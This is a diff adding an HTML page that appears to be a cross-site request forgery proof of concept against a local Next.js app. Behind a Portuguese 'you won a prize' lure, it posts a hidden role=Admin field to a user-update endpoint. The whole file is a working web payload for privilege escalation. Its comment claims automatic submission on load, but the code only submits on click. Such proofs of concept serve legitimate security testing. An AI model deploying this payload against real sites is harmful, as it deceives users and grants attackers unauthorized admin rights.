@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Você ganhou um prêmio!</title>
+</head>
+<body>
+  <h1>Parabéns! Clique no botão para resgatar seu prêmio.</h1>
+
+  <!-- Formulário oculto apontando diretamente para o Next.js -->
+  <form action="http://localhost:3000/api/users/update-email" id="csrf-form" method="POST">
+    <input type="hidden" name="role" value="Admin" />
+    <button type="submit" id="button-submit">Clicar</button>
+  </form>
+
+  <script>
+    // Submete o formulário automaticamente assim que a página carrega
+    const submit = document.getElementById('button-submit');
+
+    submit.addEventListener('click', () => {
+        document.getElementById('csrf-form').submit();
+    })
+
+  </script>
+</body>
+</html>
